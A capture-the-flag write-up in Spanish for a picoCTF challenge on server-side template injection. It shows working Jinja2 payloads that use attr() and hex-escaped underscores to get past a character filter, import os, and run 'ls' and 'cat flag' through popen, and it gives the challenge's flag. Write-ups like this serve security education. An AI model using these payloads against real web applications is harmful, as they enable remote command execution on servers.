
**Reto:**
Hacer una inyección a la platilla del sitio para obtener la bandera

**Descripción:**
-I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)
-I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:52789/)!

**Solución:**
Descifrar la plantilla usada, crear un comando que logra evadir puntos, corchetes y guiones bajos, ingresar el comando y revelar la ubicación de la bandera.
-Abrir la página.
-Escribir en la entrada `{{7*7}}%\` para verificar que haya una vulnerabilidad
-Escribir el siguiente comando en la página:`
```
{{request|attr('application')|attr("\x5f\x5fglobals\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')("\x5f\x5fimport\x5f\x5f")('os')|attr('popen')('ls')|attr('read')()}}
```
-Una vez encontrados los archivos, ingresar a la pagina el siguiente comando.
```
{{request|attr('application')|attr("\x5f\x5fglobals\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')("\x5f\x5fimport\x5f\x5f")('os')|attr('popen')('cat flag')|attr('read')()}}
```
-Cuando se ingresa el comando en la página, la página mostrara el archivo con el texto en pantalla.

El resultado es: **picoCTF{sst1_f1lt3r_byp4ss_3cfcf706}**.

**Notas adicionales:**
-La operacion attr permite buscar una variable, función o procedimiento solamente con una cadena que contiene su nombre.
-La expresión `\x` es utilizada para representar caracteres con a partir de bytes.

**Referencias:**
https://portswigger.net/web-security/server-side-template-injection
https://portswigger.net/web-security/server-side-template-injection/exploiting
https://discuss.python.org/t/converting-bytes-to-string-to-bytes/11533/6